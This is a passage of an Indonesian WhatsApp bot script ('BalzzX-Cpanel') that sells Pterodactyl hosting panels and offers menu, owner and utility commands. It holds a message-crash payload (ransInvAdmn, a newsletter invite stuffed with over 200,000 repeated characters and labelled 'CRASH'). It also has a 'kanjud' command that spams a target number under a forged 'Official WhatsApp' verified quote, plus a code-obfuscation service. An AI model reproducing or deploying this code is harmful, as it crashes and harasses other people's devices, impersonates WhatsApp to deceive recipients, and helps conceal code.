require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util')
const os = require('os')
const FileType = require('file-type')
const JsConfuser = require('js-confuser')
const axios = require('axios')
const chalk = require('chalk')
const sharp = require('sharp')
const crypto = require('crypto')
const speed = require('performance-now')
const { exec } = require("child_process")

module.exports = async (balzzx, m) => {
try {
const body = (
(m.mtype === 'conversation' && m.message.conversation) ||
(m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
(m.mtype === 'documentMessage' && m.message.documentMessage.caption) ||
(m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
(m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
(m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
(m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
) ? (
(m.mtype === 'conversation' && m.message.conversation) ||
(m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
(m.mtype === 'documentMessage' && m.message.documentMessage.caption) ||
(m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
(m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
(m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
(m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
) : '';

const budy = (typeof m.text === 'string') ? m.text : '';
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const sender = m.key.fromMe ? (balzzx.user.id.split(':')[0]+'@s.whatsapp.net' || balzzx.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await balzzx.decodeJid(balzzx.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const isPremium = premium.includes(m.sender)
const pushname = m.pushName || `Unknown`
const from = m.key.remoteJid
const isGroup = from.endsWith('@g.us')
const groupMetadata = isGroup 
  ? await balzzx.groupMetadata(m.chat).catch(() => ({})) 
  : {};
const groupName = groupMetadata.subject || '';
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const groupOwner = groupMetadata.owner || '';
const groupMembers = groupMetadata.participants || [];
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const isBot = botNumber.includes(senderNumber)
const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}
const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `ꪎ ${global.ownername}`
}}}
const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `ꪎ ${global.ownername}`,jpegThumbnail: ""}}}
const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `ꪎ ${global.ownername}`,jpegThumbnail: ""}}}
const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `ꪎ ${global.ownername}`,jpegThumbnail: ""}}}
const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "ꪎ BalzzX-MD"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `ꪎ ${global.ownername}`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `ꪎ ${global.ownername}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}
const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `ꪎ ${global.ownername}`,jpegThumbnail: ""}}}
const figlet = require('figlet');
if (m.message && m.text && m.text.startsWith('.')) {
    console.log(chalk.cyan(`\n🚴💨 [ BalzzXDev ]`));
    console.log(chalk.green(`➜ Command :`), chalk.white(`${prefix + command}`));
    console.log(chalk.green(`➜ From    :`), chalk.white(m.isGroup ? `Group (${m.sender.split("@")[0]})` : `Private (${m.sender.split("@")[0]})`));
    console.log(chalk.cyan(`───────────────────────`));
}
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)


//~~~~~Function~~~~~//

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ81';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

async function ransInvAdmn(target, ptcp = true) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "KANJUD CRASH?" + "ી".repeat(99999),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await balzzx.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
        console.log(err);
    }
}

function toStyledText(text) {
    const normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const styled = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ";
    
    return text.split('').map(c => {
        let index = normal.indexOf(c);
        return index !== -1 ? styled[index] : c;
    }).join('');
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function sendOfferCall(isTarget) {
    try {
        await balzzx.offerCall(isTarget);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}

async function sendOfferVideoCall(isTarget) {
    try {
        await balzzx.offerCall(isTarget, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}

const jsobfus = require('javascript-obfuscator')
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `BalzzXEnc`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

const fetchJson = async (url, options) => {
    try {
        options ? options : {}
        const res = await axios({
            method: 'GET',
            url: url,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
            },
            ...options
        })
        return res.data
    } catch (err) {
        return err
    }
}

const runtime = function(seconds = process.uptime()) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? "d " : "d ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? "h " : "h ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? "m " : "m ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? "s" : "s") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}

const clockString = (ms) => {
    let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000)
    let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
    let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}



        
 //~~~~~End Func~~~~~//



//~~~~~Awal Case~~~~~//
switch(command) {
case "menu": {
await balzzx.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
let teksnya = `
Haii @${m.sender.split("@")[0]},
Perkenalkan, saya adalah *BalzzX-Cpanel*. klik tombol cpanel di bawah ini untuk mengetahui berbagai fitur yang dapat saya lakukan.
`
await balzzx.sendMessage(m.chat, {
  footer: `© BalzzXDev`,
  buttons: [
    {
      buttonId: `.xxyy`,
      buttonText: { displayText: 'Cpanel' },
      type: 1
    },
    {
      buttonId: `.dev`,
      buttonText: { displayText: 'Developer' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `BalzzX-Cpanel`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 99999999,
  caption: teksnya,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `BalzzX-Cpanel`,
      body: `📍 Runtime : ${runtime(process.uptime())}`,
      thumbnailUrl: global.imgthumb,
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break
case 'xxyy': {
if (!isPremium) return
await balzzx.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
const message = `*Hai @${m.sender.split("@")[0]} 👋🏻*

┌  \`❲ 𝗕𝗼𝘁 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ❳\` ─ •
▨.  *𝖡𝗈𝗍 𝖭𝖺𝗆𝖾 :* ${global.namabot}
▨.  *𝖢𝗋𝖾𝖺𝗍𝗈𝗋 :* ${global.ownername}
▨.  *𝖵𝖾𝗋𝗌𝗂𝗈𝗇 :* ${global.botversion}
▨.  *Runtime :* ${runtime(process.uptime())}
└────────────────── ─

 *< Panelmenu >*
   ➣ .1gb username
   ➣ .2gb username
   ➣ .3gb username
   ➣ .4gb username
   ➣ .5gb username
   ➣ .6gb username
   ➣ .7gb username
   ➣ .8gb username
   ➣ .9gb username
   ➣ .10gb username
   ➣ .unli username
   ➣ .cadmin
   ➣ .listpanel
   ➣ .listadmin
   ➣ .delpanel
   ➣ .deladmin
   
 *< Othermenu >*
   ➣ .pinterest
   ➣ .ht
   ➣ .get
   ➣ .tourl
   ➣ .cekidch
   ➣ .cekidgc
   ➣ .reactch
   
 *< Ownermenu >*
   ➣ .addprem
   ➣ .delprem
   ➣ .listprem
   ➣ .addowner
   ➣ .delowner
   ➣ .listowner
   ➣ .self
   ➣ .public`;

await balzzx.sendMessage(m.chat, {
video: { url: "https://files.catbox.moe/im3u35.mp4"},
gifPlayback: true,
caption: message,
 contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender], 
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: global.ownername + ' | Channels'
            },
 externalAdReply: {
 title: global.namabot,
 body: `BalzzX Heker 😈`,
 sourceUrl: global.linkSaluran,
 mediaType: 1,
 showAdAttribution: true
 }
 }},{quoted: m});
}
break;
case "hidetag": case "ht": {
if (!isGroup) return m.reply(`Khusus Grup`)
if (!isCreator && !isAdmins) return m.reply(`Khusus Admin`)
if (!m.quoted && !text) return m.reply("mohon sertakan pesan/reply pesan")
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
balzzx.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: qtext})
}
break;
case 'pinterest': case 'pin': {
    if (!text) return m.reply('Sertakan Kata Kunci!');
    m.reply('Mencari Gambar..!');
    try {
        let res = await fetch(`https://api.siputzx.my.id/api/s/pinterest?query=${text}`);
        let response = await res.json();
        if (!response.status || !response.data || response.data.length === 0) {
            return m.reply('Tidak ada hasil ditemukan!');
        }
        let result = response.data[Math.floor(Math.random() * response.data.length)];
        balzzx.sendMessage(m.chat, {
            image: { url: result.images_url },
            caption: `Judul: ${result.grid_title}\nLink: ${result.pin}`,
            quoted: m 
        });
    } catch (err) {
        m.reply('Terjadi Kesalahan');
    }
}
break;
case "tourl": {
if (!/image/.test(mime)) return m.reply("Kirim/reply foto")
let media = await balzzx.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'skyzopedia.png');

let teks = directLink.toString()
await balzzx.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break
case "dev":
  await balzzx.sendMessage(sender, {
    contacts: {
      displayName: "Owner Bot",
      contacts: [
        {
          vcard: `
BEGIN:VCARD
VERSION:3.0
FN:BalzzXDev
ORG:Developer Bot WhatsApp;
TEL;type=CELL;type=VOICE;waid=6281227811256:+62 812 2781 1256
END:VCARD`
        }
      ]
    }
  })
break;
case "apkmod": {
if (!text) return m.reply("Example: capcut")
await balzzx.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.siputzx.my.id/api/apk/happymod?query=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.name}
* *Link Download:* ${i.link}\n`
}
m.reply(teks)
balzzx.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error"))
}
break;
case "reactch": {
if (!isCreator && !isPremium) return m.reply('Khusus Owner');
if (!q) return m.reply("Contoh: .reactch https://whatsapp.com/channel/invite/kode/channelid pesan");

const [link, ...messageParts] = q.split(" ");
const messageText = messageParts.join(" ");

if (!link || !messageText) return m.reply("Format salah. Gunakan: .reactch <link> <pesan>");
if (!link.includes("https://whatsapp.com/channel/")) return m.reply("Link channel tidak valid!");

let inviteCode = link.split('/')[4];
let serverId = link.split('/')[5];

const charMap = {
a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖', h: '🅗', i: '🅘', j: '🅙',
k: '🅚', l: '🅛', m: '🅜', n: '🅝', o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣',
u: '🅤', v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
1: '➊', 2: '➋', 3: '➌', 4: '➍', 5: '➎', 6: '➏', 7: '➐', 8: '➑', 9: '➒', 0: '⓿',
' ': '▫️'
};

const converted = messageText
.toLowerCase()
.split('')
.map(char => charMap[char] || '')
.join('');

if (!converted) return m.reply("Pesan hanya boleh berisi huruf, angka, dan spasi");

try {
let res = await balasx.newsletterMetadata("invite", inviteCode);
await balzzx.newsletterReactMessage(res.id, serverId, converted);
m.reply(`Berhasil mengirim reaction:\n${converted}\nke channel *${res.name}*`);
} catch (e) {
console.log(e);
m.reply("Gagal mengirim reaction. Pastikan link dan pesan valid.");
}
}
break;
case "get": case "g": {
if (!isCreator) return m.reply("Khusus Owner")
if (!text) return m.reply("Example: https://example.com")
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break;
case "addprem": {
    if (!isCreator) return
    if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${global.owner}`)
   let prrkek = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
    let ceknya = await balzzx.onWhatsApp(prrkek) // Mengecek Apkah Nomor ${prrkek} Terdaftar Di WhatsApp 
    if (ceknya.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
    premium.push(prrkek)
    fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
    m.reply(`Successfully Added ${prrkek} To Database`)
}
break;
case "delprem": {
    if (!isCreator) return
    if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${global.owner}`)
    let ya = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
    let unp = premium.indexOf(ya)
    premium.splice(unp, 1)
    fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
    m.reply(`Successfully Removed ${ya} From Database`)
}
break
case "listprem": {
if (!isCreator) return m.reply("❗ *Access Denied*\nFitur Only `Owner`")
 let premList = JSON.parse(fs.readFileSync("./database/premium.json"));
 
 if (premList.length === 0) return m.reply("⚠️ Tidak ada Premium yang terdaftar!");
 let text = "💭 *Daftar Premium:*\n\n";
 premList.forEach((prrem, index) => {
 text += `- ${index + 1}. @${prrem}\n`;
 });
 balzzx.sendMessage(m.chat, { text, mentions: premList.map(v => v + "@s.whatsapp.net") }, { quoted: m });
}
break;
case "addcreator":
case "addowner": {
 if (!isCreator) return m.reply("❗ *Access Denied*\nFitur Only `Owner`")
 let nomor;
 if (m.quoted && m.quoted.sender) {
 nomor = m.quoted.sender.split("@")[0];
 } else if (args[0]) {
 nomor = args[0].replace(/[^0-9]/g, ""); 
 } else {
 return m.reply(`Penggunaan: ${prefix+command} <nomor atau tag>\nContoh: ${prefix+command} 6285659202292`);
 }
 let ceknya = await balzzx.onWhatsApp(nomor + "@s.whatsapp.net"); // Mengecek apakah nomor valid
 if (ceknya.length == 0) return m.reply("⚠️ Masukkan nomor yang valid dan terdaftar di WhatsApp!");
 let ownerList = JSON.parse(fs.readFileSync("./database/owner.json"));
 if (ownerList.includes(nomor)) return m.reply("✅ Nomor tersebut sudah ada dalam daftar Owner!");
 ownerList.push(nomor);
 fs.writeFileSync("./database/owner.json", JSON.stringify(ownerList, null, 2));
 m.reply(`✅ Berhasil menambahkan *${nomor}* sebagai Owner!`);
}
break;
case "delcreator":
case "delowner": {
 if (!isCreator) return m.reply("❗ *Access Denied*\nFitur Only `Owner`")
 let nomor;
 if (m.quoted && m.quoted.sender) {
 nomor = m.quoted.sender.split("@")[0];
 } else if (args[0]) {
 nomor = args[0].replace(/[^0-9]/g, ""); 
 } else {
 return m.reply(`Penggunaan: ${prefix+command} <nomor atau tag>\nContoh: ${prefix+command} 6285659202292`);
 }
 let ownerList = JSON.parse(fs.readFileSync("./database/owner.json"));
 if (!ownerList.includes(nomor)) return m.reply("⚠️ Nomor tidak ditemukan dalam daftar Owner!");
 ownerList = ownerList.filter(owner => owner !== nomor);
 fs.writeFileSync("./database/owner.json", JSON.stringify(ownerList, null, 2));
 m.reply(`✅ Berhasil menghapus *${nomor}* dari daftar Owner!`);
}
break;
case "listcreator":
case "listowner": {
if (!isCreator) return m.reply("❗ *Access Denied*\nFitur Only `Owner`")
 let ownerList = JSON.parse(fs.readFileSync("./database/owner.json"));
 
 if (ownerList.length === 0) return m.reply("⚠️ Tidak ada Owner yang terdaftar!");
 let text = "💭 *Daftar Owner:*\n\n";
 ownerList.forEach((owner, index) => {
 text += `- ${index + 1}. @${owner}\n`;
 });
 balzzx.sendMessage(m.chat, { text, mentions: ownerList.map(v => v + "@s.whatsapp.net") }, { quoted: m });
}
break;
case 'self': {
    if (!isCreator) return
    balzzx.public = false
    m.reply(`*Switch To Mode :* \`Self\``)
}
break;
case 'public': {
    if (!isCreator) return
    balzzx.public = true
    m.reply(`*Switch To Mode :* \`Public\``)
}
break;
case 'kanjud': {
    if (!isPremium) return m.reply("Khusus Premium!");
    if (!q) return balzzx.sendMessage(m.chat, { text: 'Contoh: .kanjud 628xxxxx' }, { quoted: m });

    const target = q.replace(/\D/g, '') + '@s.whatsapp.net';

    const fakeVerified = {
        key: {
            fromMe: false,
            remoteJid: "status@broadcast",
            participant: "0@s.whatsapp.net"
        },
        message: {
            extendedTextMessage: {
                text: "Balzzx Heker 😈",
                matchedText: "WhatsApp Inc.",
                canonicalUrl: "https://www.whatsapp.com",
                description: "Official WhatsApp",
                title: "WhatsApp Inc.",
                jpegThumbnail: Buffer.alloc(0)
            }
        }
    };

    const textSpam = "💦 Kanjutt! kiriman spesial dari bot 😈";

    try {
        for (let i = 0; i < 5; i++) {
            await balzzx.sendMessage(target, { text: textSpam }, { quoted: fakeVerified });
            await delay(5000);
        }

        balzzx.sendMessage(m.chat, { text: `✅ Terkirim ke ${q}` }, { quoted: m });
    } catch (err) {
        console.error(err);
        balzzx.sendMessage(m.chat, { text: '❌ Gagal kirim pesan ke target.' }, { quoted: m });
    }
}
break;
case 'neko': {
if (!isPremium) m.reply("Khusus Premium!")
await balzzx.sendMessage(m.chat, {react: {text: '❤', key: m.key}})
    try {
        const res = await axios.get('https://api.waifu.pics/nsfw/neko');
        const imageUrl = res.data.url;

        await balzzx.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: 'Kyaaa~ 🐱✨',
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        await balzzx.sendMessage(m.chat, {
            text: 'Gagal mengambil gambar neko 😿',
        }, { quoted: m });
    }
}
break;
case 'waifu': {
if (!isPremium) m.reply("Khusus Premium!")
await balzzx.sendMessage(m.chat, {react: {text: '❤', key: m.key}})
    try {
        const res = await axios.get('https://api.waifu.pics/nsfw/waifu');
        const imageUrl = res.data.url;

        await balzzx.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: 'Kyaaa~ 🐱✨',
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        await balzzx.sendMessage(m.chat, {
            text: 'Gagal mengambil gambar neko 😿',
        }, { quoted: m });
    }
}
break;
case 'loli': {
if (!isPremium) m.reply("Khusus Premium!")
await balzzx.sendMessage(m.chat, {react: {text: '❤', key: m.key}})
    try {
        const res = await axios.get('https://api.waifu.pics/sfw/neko');
        const imageUrl = res.data.url;

        await balzzx.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: 'Kyaaa~ 🐱✨',
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        await balzzx.sendMessage(m.chat, {
            text: 'Gagal mengambil gambar neko 😿',
        }, { quoted: m });
    }
}
break;
case 'enc': {
 if (!text) return m.reply(`Contoh: ${prefix + command} const balzzx = require('balzzx-hytami')`)
 const crypto = require('crypto')
 const fs = require('fs').promises
 const path = require('path')
 try {
 let meg = await obfus(q) // Menggunakan fungsi obfuscator
 let encryptedCode = meg.result
 let namafile = `Encrypted_${crypto.randomBytes(6).toString('hex')}.js`
 let filePath = path.join(__dirname, namafile)
 // Simpan kode yang telah dienkripsi ke dalam file
 await fs.writeFile(filePath, encryptedCode)
 // Kirim file JS hasil enkripsi
 await balzzx.sendMessage(m.chat, {
 document: await fs.readFile(filePath),
 fileName: namafile,
 mimetype: 'application/javascript'
 }, { quoted: m })
 // Hapus file setelah dikirim
 await fs.unlink(filePath)
 } catch (err) {
 console.error(err)
 await m.reply('Terjadi kesalahan saat mengenkripsi kode.')
 }
}
break;
case "cadmin": {
if (!isCreator) return m.reply("Khusus Owner")
if (!text) return m.reply("username")
let username = text.toLowerCase()
let email = username+"@balzzx.dev"
let name = (username) + " Admin"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await balzzx.sendMessage(orang, {text: teks}, {quoted: m})
}
break;
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isPremium) return m.reply("Khusus Premium Dek")
if (!text) return m.reply("username")
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@balzzx.dev"
let name = (username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_23",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await balzzx.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break;
case "listadmin": {
if (!isCreator) return m.reply("Khusus Owner")
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await balzzx.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break;
case "listpanel": case "listp": case "listserver": {
if (!isCreator) return
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
